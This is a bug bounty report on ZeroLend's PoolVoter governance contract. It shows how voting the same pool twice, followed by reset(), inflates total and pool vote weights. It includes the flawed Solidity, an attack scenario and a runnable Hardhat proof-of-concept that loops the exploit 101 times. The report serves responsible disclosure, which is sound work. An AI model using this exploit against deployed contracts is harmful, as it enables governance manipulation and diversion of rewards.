# 29012 - \[SC - High] Votes manipulation in PoolVoter

Submitted on Mar 4th 2024 at 18:33:40 UTC by @DuckAstronomer for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29012

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Vulnerability Details

**Affected asset**: <https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol>

`PoolVoter` contract allows to vote for the Gauge for anyone who has voting power by staking in the `VestedZeroNFT`.

The `vote()` function allows to specify pools associated with gauges and their respective weights.

```
function vote(
    address[] calldata _poolVote,
    uint256[] calldata _weights
) external {}
```

However, a crucial flaw exists as the function fails to check for repeated pools in the `_poolVote` array. Moreover, it only considers the last weight if the same pool is utilized, as seen here - <https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L117>.

```
if (_gauge != address(0x0)) {
    _updateFor(_gauge);
    _usedWeight += _poolWeight;
    totalWeight += _poolWeight;
    weights[_pool] += _poolWeight;
    poolVote[_who].push(_pool);
    votes[_who][_pool] = _poolWeight;  // !!!
}
```

When a voter calls the `reset()` function to retrieve their voting power back and vote for another gauge, only the last weight is taken into account in case of repeated pool voting.

As a result, the voter recovers the full voting power. Yet `totalWeight` and `weights[_pool]` are decreased only by the last element from the `_weights` array passed to the `vote()`.

```
uint256 _votes = votes[_who][_pool];

if (_votes > 0) {
    _updateFor(gauges[_pool]);
    totalWeight -= _votes;
    weights[_pool] -= _votes;
    votes[_who][_pool] = 0;
}
```

**Attack scenario**:

1. The attacker possesses a voting power of `19.01 ether`.
2. They invoke `vote()` to vote for the same gauge with the following parameters:
   * \_poolVote = \[gauge, gauge]
   * \_weights = \[19 ether, 1e8]
3. Further they call `reset()`, but `weights[_pool]` and `totalWeight` are only decreased by `1e8`.
4. The attacker retains the full `19.01 ether` voting power. But `weights[_pool]` and `totalWeight` are now increased by `19 ether`.
5. By repeating steps 2-3 in a loop many times, the attacker can consolidate the majority of votes for their chosen gauge, and all rewards will be distributed to it.
6. By repeating steps 2-3 for **100** times, it's tantamount to having `1900 ether` voting power.

## Proof of Concept

To run the Poc put it's code to the `governance-main/test/PoolVoter.poc.ts` file, generate random private key, and issue the following command:

```
WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/PoolVoter.poc.ts --config hardhat.config.ts --network hardhat
```

```
import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import {
  GaugeIncentiveController,
  OmnichainStaking,
  Pool,
  PoolVoter,
  StakingBonus,
  TestnetERC20,
  VestedZeroNFT,
  ZeroLend,
} from "../typechain-types";
import { e18 } from "./fixtures/utils";
import { deployVoters } from "./fixtures/voters";

// Put inside governance-main/test/PoolVoter.poc.ts

// Run as:
// WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/PoolVoter.poc.ts --config hardhat.config.ts --network hardhat

describe.only("PoolVoter Immunefi Boost", () => {
  let ant: SignerWithAddress;
  let now: number;
  let omniStaking: OmnichainStaking;
  let poolVoter: PoolVoter;
  let reserve: TestnetERC20;
  let stakingBonus: StakingBonus;
  let vest: VestedZeroNFT;
  let pool: Pool;
  let aTokenGauge: GaugeIncentiveController;
  let zero: ZeroLend;

  beforeEach(async () => {
    const deployment = await loadFixture(deployVoters);
    ant = deployment.ant;
    now = Math.floor(Date.now() / 1000);
    omniStaking = deployment.governance.omnichainStaking;
    poolVoter = deployment.poolVoter;
    reserve = deployment.lending.erc20;
    stakingBonus = deployment.governance.stakingBonus;
    vest = deployment.governance.vestedZeroNFT;
    zero = deployment.governance.zero;
    pool = deployment.lending.pool;
    aTokenGauge = deployment.aTokenGauge;

    // deployer should be able to mint a nft for another user
    await vest.mint(
      ant.address,
      e18 * 20n, // 20 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      true, // penalty -> false
      0
    );

    // stake nft on behalf of the ant
    await vest
      .connect(ant)
      ["safeTransferFrom(address,address,uint256)"](
        ant.address,
        stakingBonus.target,
        1
      );

    // there should now be some voting power for the user to play with
    // ant voting power is ~ 19 ether
    expect(await omniStaking.balanceOf(ant.address)).lessThan(e18 * 20n);
  });

  it("ant fraudulently increases his voting power by 100x", async function () {
    expect(await poolVoter.totalWeight()).eq(0);
    for (let i=0; i < 101; i++) {
      // Vote for the same pool 2 times but with different weights
      // 19 ether and 1e8 wei
      await poolVoter.connect(ant).vote(
        [reserve.target, reserve.target],
        [19n*e18, 1e8]
      );
      // Reset() call resets only 1e8 wei votes.
      // However, 19 ether votes remains untouched in totalWeight().
      // ant can has voting power of 19 ether again and again.
      // https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L67
      // https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L61-L63
      await poolVoter.connect(ant).reset();
    }
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n * 100n);
  });
});
```
